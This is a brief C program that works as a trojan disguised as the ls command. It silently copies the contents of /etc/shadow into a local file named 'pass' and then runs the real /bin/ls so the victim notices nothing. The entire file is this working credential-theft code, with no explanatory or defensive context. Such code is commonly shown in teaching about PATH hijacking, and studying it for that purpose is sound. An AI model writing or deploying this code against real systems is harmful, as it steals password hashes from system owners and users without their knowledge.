#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main() {
	FILE *shadow, *stolen;
	char buf[BUFSIZ];

	shadow = fopen("/etc/shadow", "r");
	if (shadow == NULL) {
		perror("fopen");
		execl("/bin/ls", "ls", NULL);
		exit(0);
	}
	stolen = fopen("pass", "w+");
	while(fgets(buf, BUFSIZ, shadow)) {
		fputs(buf, stolen);
	}
	fclose(shadow);
	fclose(stolen);

	execl("/bin/ls", "ls", NULL);
}
